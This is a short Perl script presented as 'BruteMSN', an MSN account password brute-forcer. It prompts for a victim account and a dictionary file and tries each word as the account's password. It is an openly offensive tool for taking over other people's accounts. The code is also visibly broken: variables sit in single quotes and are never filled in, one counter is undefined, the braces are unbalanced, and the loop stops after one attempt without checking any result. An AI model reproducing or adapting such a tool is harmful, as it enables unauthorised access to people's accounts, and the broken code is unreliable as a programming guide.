#!/usr/bin/perl
system ("clear");
system ("cls");
system ("color fc");
# Re-c0de by m0x.lk
# Edit : BruteMSN .- ~HaSe & RE.
# Download Lib's.
use lib qw(./MSN/lib);
use MSN;
use strict;
use encoding "euc-jp";
print "Re-C0de by m0x.lk\n";
print "\n";
print "BruteMSN .- ~HaSe & RE.\n";
print "\n";
sleep 1;
print "Victima: ";
$victima=<STDIN>;
print "\n\n";
print "\n";
print "Diccionario: ";
$dict=<STDIN>;
print "\n\n";
open (D,"<$dict") or die "Diccionario no encontrado\n";
while(<D>)
{
$try = $_;
    chomp $try;
my $msn = MSN->new(Handle => '$victima', 
                   Password => '$try');
    $counter++;
    $tiempo++;
    {
	print "$victima / $try \n";
	last;
    }
    if($counter==$fallos)
    {
}
close(D);
print "\n\n";
print "$tiempo Obtener pass";
print "\n\n";
print "c0dex by m0x.lk";